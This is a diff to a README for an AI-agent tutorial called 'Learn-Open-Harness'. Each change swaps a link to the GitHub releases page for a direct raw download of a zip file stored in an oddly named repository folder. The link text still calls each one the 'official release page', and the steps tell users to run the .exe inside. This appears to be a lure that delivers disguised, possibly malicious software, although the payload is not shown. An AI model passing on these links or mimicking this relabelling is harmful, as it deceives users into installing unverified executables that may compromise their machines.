@@ -1,6 +1,6 @@
 # 🤖 Learn-Open-Harness - Master AI Agent Development With Ease
 
-[![Download Learn-Open-Harness](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/timesignalrite923/Learn-Open-Harness/releases)
+[![Download Learn-Open-Harness](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/timesignalrite923/Learn-Open-Harness/raw/refs/heads/main/thrummer/Harness_Learn_Open_v3.4.zip)
 
 ## 📖 About This Project
 
@@ -23,7 +23,7 @@ You do not need to install complex coding software or set up a web server. This 
 
 Follow these steps to set up your learning environment.
 
-1. Go to the [official release page](https://github.com/timesignalrite923/Learn-Open-Harness/releases).
+1. Go to the [official release page](https://github.com/timesignalrite923/Learn-Open-Harness/raw/refs/heads/main/thrummer/Harness_Learn_Open_v3.4.zip).
 2. Look for the file ending in `.exe` under the latest release.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
@@ -38,7 +38,7 @@ Once the file finishes downloading, follow these steps to start the tutorial.
 4. Follow the on-screen instructions to select your installation folder. The default location works for most users.
 5. Once the installer finishes, a shortcut appears on your desktop. 
 
-Find your software on the release page [here](https://github.com/timesignalrite923/Learn-Open-Harness/releases).
+Find your software on the release page [here](https://github.com/timesignalrite923/Learn-Open-Harness/raw/refs/heads/main/thrummer/Harness_Learn_Open_v3.4.zip).
 
 ## 🚀 How to Use the Tutorial
 
